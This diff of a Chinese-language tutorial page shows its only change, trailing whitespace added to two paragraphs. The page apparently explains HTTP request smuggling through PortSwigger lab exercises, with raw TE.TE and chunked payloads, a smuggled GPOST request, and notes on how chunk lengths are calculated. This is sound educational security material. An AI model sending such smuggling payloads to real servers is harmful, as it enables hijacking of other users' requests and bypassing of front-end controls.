@@ -253,7 +253,7 @@
 2. 內容為: q=smuggling
 3. 結束: 0
 </code></pre><blockquote>
-<p>第二點的內容是不包含 \r\n 的<br>除非請求本身不是 POST，需要直接結束的話<br>則需要把 \r\n 帶進去，且要計算長度</p>
+<p>第二點的內容是不包含 \r\n 的<br>除非請求本身不是 POST，需要直接結束的話<br>則需要把 \r\n 帶進去，且要計算長度  </p>
 </blockquote>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /search HTTP/1.1</span><br><span class="line">Host: xxxxxxxx</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">b</span><br><span class="line">q=smuggling</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
 <p>而 HTTP 為了預防此兩個標頭同時使用<br>所以當這兩個標頭同時出現的時候，會忽略 <code>Content-Length</code> 這個標頭<br>再加上 front-end 和 back-end server 處理此兩個標頭的方式可能不一樣  </p>
@@ -283,7 +283,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac1b1fd31f891d6c80bb2c930035000c.web-security-academy.net</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: cow</span><br><span class="line"></span><br><span class="line">16</span><br><span class="line">GPOST /test HTTP/1.1</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">--- 不包含此行</span><br></pre></td></tr></table></figure>
 <p>byte 算法跟前面的 TE.CL 一樣  </p>
 <blockquote>
-<p>如果此漏洞是 front-end server 針對 TE 有解析問題的話<br>Payload 和算法就要改成 CL.TE 的方式了</p>
+<p>如果此漏洞是 front-end server 針對 TE 有解析問題的話<br>Payload 和算法就要改成 CL.TE 的方式了  </p>
 </blockquote>
 <p>第一次送 request 會得到正常的請求<br><img src="/http-request-smuggling/image-08.png" alt="">  </p>
 <p>第二次送，因為前一次 request 走私了一個 request<br>所以 response 會回應到此次 request 上<br>就得到 Unreconize GPOST Method 了<br><img src="/http-request-smuggling/image-09.png" alt="">  </p>
